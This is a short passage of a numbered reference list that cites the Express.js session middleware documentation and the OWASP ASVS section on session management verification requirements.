4. [Express.js Session Documentation](https://github.com/expressjs/session)
5. [OWASP ASVS - V3: Session Management Verification Requirements](https://owasp.org/www-project-application-security-verification-standard/)
